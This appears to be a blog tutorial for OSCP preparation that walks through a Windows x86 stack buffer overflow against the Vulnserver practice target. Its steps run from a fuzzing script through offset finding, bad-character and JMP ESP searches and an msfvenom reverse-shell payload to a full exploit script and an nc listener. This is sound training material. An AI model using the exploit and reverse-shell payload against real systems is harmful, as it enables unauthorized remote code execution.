---
title: "Buffer Overflow Exploitation: A Complete OSCP Guide"
date: "2026-03-12"
excerpt: "Step-by-step walkthrough of exploiting buffer overflows on Windows x86, covering fuzzing, finding EIP offset, bad characters, shellcode generation and shell delivery."
tags: ["oscp", "exploitation", "buffer-overflow"]
featured: true
---

# Introduction

Buffer overflow vulnerabilities remain one of the most fundamental exploit techniques you'll encounter on the OSCP exam and in real-world penetration testing. This guide covers the complete exploitation workflow for a classic Windows x86 stack-based buffer overflow.

## Lab Setup

You'll need:
- **Kali Linux** (attacker machine)
- **Windows 7 x86** (target VM — with DEP/ASLR disabled for this exercise)
- **Immunity Debugger** with Mona.py
- **Vulnserver** (practice target)

```bash
# Clone vulnserver
git clone https://github.com/stephenbradshaw/vulnserver.git
```

## Step 1: Fuzzing

The first step is to identify the crash point. We send increasingly large payloads until the application crashes.

```python
#!/usr/bin/env python3
import socket
import sys

target = "192.168.1.100"
port = 9999

buffer = b"TRUN /.:/"

try:
    for size in range(100, 10000, 100):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        payload = buffer + b"A" * size
        print(f"[*] Sending {size} bytes")
        s.send(payload)
        s.close()
except Exception as e:
    print(f"[!] Crashed at {size} bytes: {e}")
    sys.exit()
```

The application crashed at **2400 bytes**. Now we need to pinpoint the exact offset.

## Step 2: Finding the EIP Offset

Use Metasploit's `pattern_create` to generate a unique cyclic pattern:

```bash
msf-pattern_create -l 3000
```

Send the pattern and record the EIP value from Immunity Debugger. Then find the offset:

```bash
msf-pattern_offset -l 3000 -q 396F4338
# [*] Exact match at offset 2003
```

**EIP offset: 2003 bytes**

## Step 3: Confirming EIP Control

```python
payload = b"A" * 2003 + b"B" * 4 + b"C" * (3000 - 2003 - 4)
```

If EIP shows `42424242` (BBBB), we have control. ✓

## Step 4: Finding Bad Characters

Send all bytes from `\x00` to `\xff` (excluding known bad chars like `\x00`) and inspect memory in Immunity:

```python
badchars = (
    b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
    # ... all bytes ...
)
```

Use mona to identify bad characters automatically:

```
!mona bytearray -b "\x00"
!mona compare -f C:\mona\bytearray.bin -a <ESP address>
```

**Bad characters found:** `\x00`

## Step 5: Finding a JMP ESP

We need a `JMP ESP` instruction in a module without ASLR/DEP:

```
!mona jmp -r esp -cpb "\x00"
```

Found at: `0x625011AF` → Little endian: `\xAF\x11\x50\x62`

## Step 6: Generating Shellcode

```bash
msfvenom -p windows/shell_reverse_tcp \
  LHOST=192.168.1.50 \
  LPORT=4444 \
  -b "\x00" \
  -f python \
  -v shellcode
```

## Step 7: Final Exploit

```python
#!/usr/bin/env python3
import socket

target = "192.168.1.100"
port = 9999

shellcode = b""
shellcode += b"\xdb\xc0\xd9\x74\x24\xf4..."  # your shellcode here

nop_sled = b"\x90" * 16
padding   = b"A" * 2003
ret_addr  = b"\xAF\x11\x50\x62"  # JMP ESP address (little endian)

payload = (
    b"TRUN /.:/" +
    padding +
    ret_addr +
    nop_sled +
    shellcode
)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target, port))
s.send(payload)
s.close()

print("[+] Payload sent! Check your listener...")
```

Start your listener:

```bash
nc -lvnp 4444
```

## Mitigation

Modern systems use multiple protections:

- **DEP/NX** — marks stack as non-executable
- **ASLR** — randomizes memory addresses
- **Stack canaries** — detect stack smashing
- **SafeSEH** — protects exception handlers

Understanding these mitigations is crucial for advanced exploitation techniques like ROP chains.

## Conclusion

Buffer overflows are a foundational exploit technique. The workflow is always: **fuzz → offset → bad chars → JMP ESP → shellcode → shell**. Practice on Vulnserver and TryHackMe's BOF prep room before your OSCP exam.

Happy hacking! 🎯
